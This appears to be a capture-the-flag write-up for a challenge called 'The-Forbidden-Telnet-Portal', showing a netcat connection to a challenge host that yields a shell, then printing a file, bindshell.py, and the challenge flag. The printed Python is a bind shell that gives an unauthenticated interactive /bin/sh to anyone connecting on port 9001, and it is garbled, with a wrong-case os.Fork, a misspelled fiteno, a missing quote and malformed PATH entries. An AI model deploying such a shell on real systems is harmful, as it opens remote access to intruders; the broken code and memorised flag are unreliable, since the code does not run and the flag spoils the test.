# The-Forbidden-Telnet-Portal

## Description
> Legends spoke of a long-forgotten era when Telnet was once a common gateway into the digital world, allowing users to access remote systems and execute commands. However, as time passed, its usage faded due to security concerns, and the portals were shut down or hidden away to protect the digital realm from malicious intent.

## Solution
* We are given a domain name and a port number.
* Connect to it using netcat:  
`nc 0.cloud.chals.io <port-no>`
* We get a shell
* List the files in the directory:  
`ls`
* We find a `python` file named `bindshell.py`
* Check the contents of the file:  
`cat bindshell.py`

```python
import os
import socket

HOST = '0.0.0.0'
PORT = 9001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

while True:
    conn, addr = s.accept()
    pid = os.Fork()
    if pid == 0:
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fiteno(), 1)
        os.dup2(conn.fileno(), 2)
        os.execve('/bin/sh', [/bin/sh', '-i'], {'PATH': 'usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin: /bin'})

# KPMG_CTF{38748f1a026ae36d35de31d8aebd1dea}
```

* Flag:  
`KPMG_CTF{38748f1a026ae36d35de31d8aebd1dea}`
